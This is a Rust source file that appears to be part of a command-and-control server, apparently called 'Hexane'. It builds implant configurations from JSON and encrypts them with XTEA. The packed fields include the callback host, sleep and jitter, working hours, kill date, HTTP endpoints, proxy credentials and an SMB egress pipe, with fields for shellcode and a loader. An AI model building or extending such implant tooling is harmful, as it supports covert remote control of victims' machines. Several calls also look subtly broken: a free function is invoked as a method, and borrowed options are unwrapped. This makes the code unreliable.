use std::fs;
use std::str::FromStr;

use crate::return_error;
use crate::server::stream::Stream;
use crate::server::session::CURDIR;
use crate::server::error::{Result, Error};
use crate::server::cipher::{crypt_create_key, crypt_xtea};
use crate::server::types::{Compiler, Hexane, JsonData, NetworkOptions, UserSession, TRANSPORT_HTTP, TRANSPORT_PIPE};
use crate::server::instance::check_instance;
use crate::server::utils::wrap_message;


pub(crate) fn map_config(file_path: &String) -> Result<Hexane> {
    let json_file   = CURDIR.join("json").join(file_path);
    let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;

    let json_data = match serde_json::from_str::<JsonData>(contents.as_str()) {
        Ok(data)    => data,
        Err(e)      => {
            wrap_message("debug", format!("{}", contents));
            return Err(Error::SerdeJson(e))
        }
    };

    let group_id = 0;
    let mut instance = Hexane {

        current_taskid: 0, peer_id: 0, group_id, build_type: 0, network_type: 0,
        crypt_key: vec![], shellcode: vec![], config_data: vec![],
        active: false,

        compiler: Compiler {
            file_extension:     String::from(""),
            build_directory:    String::from(""),
            compiler_flags:     String::from(""),
        },

        main:       json_data.config,
        network:    json_data.network,
        builder:    json_data.builder,
        loader:     json_data.loader,

        user_session: UserSession {
            username: String::from(""),
            is_admin: false,
        },
    };

    check_instance(&mut instance)?;
    Ok(instance)
}


fn generate_config_bytes(instance: &mut Hexane) -> Result<()> {
    instance.crypt_key = crypt_create_key(16);

    let mut patch = instance.create_binary_patch()?;
    if instance.main.encrypt {
        let patch_cpy = patch.clone();
        patch = crypt_xtea(&patch_cpy, &instance.crypt_key, true)?;
    }

    instance.config_data = patch;
    Ok(())
}

fn create_binary_patch(instance: &Hexane) -> Result<Vec<u8>> {
    let mut stream = Stream::new();

    match instance.network_type {
        TRANSPORT_HTTP  => stream.pack_byte(1),
        TRANSPORT_PIPE  => stream.pack_byte(0),
        _               => return return_error!("Invalid transport type"),
    }

    stream.pack_bytes(&instance.crypt_key);
    stream.pack_string(&instance.main.hostname);

    stream.pack_dword(instance.peer_id);
    stream.pack_dword(instance.main.sleeptime);
    stream.pack_dword(instance.main.jitter);

    if let Some(ref modules) = instance.builder.loaded_modules {
        for module in modules {
            stream.pack_string(module);
        }
    }

    let working_hours = if let Some(ref hours) = instance.main.working_hours {
        i32::from_str(hours)?
    } else {
        0
    };

    let kill_date = if let Some(ref date) = instance.main.killdate {
        i64::from_str(date)?
    } else {
        0
    };

    stream.pack_int32(working_hours);
    stream.pack_dword64(kill_date);

    match &instance.network.options {
        NetworkOptions::Http(mut http) => {
            stream.pack_wstring(&http.useragent.unwrap().as_str());
            stream.pack_wstring(&http.address);
            stream.pack_dword(http.port as u32);
            stream.pack_dword(http.endpoints.len() as u32);

            for endpoint in &http.endpoints {
                stream.pack_wstring(endpoint);
            }

            stream.pack_string(&http.domain.unwrap().as_str());

            if let Some(mut proxy) = &http.proxy {
                let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
                stream.pack_dword(1);
                stream.pack_wstring(&proxy_url);
                stream.pack_wstring(&proxy.username.unwrap().as_str());
                stream.pack_wstring(&proxy.password.unwrap().as_str());
            } else {
                stream.pack_dword(0);
            }
        }
        NetworkOptions::Smb(mut smb) => {
            stream.pack_wstring(&smb.egress_pipe.unwrap().as_str());
        }
    }

    Ok(stream.buffer)
}

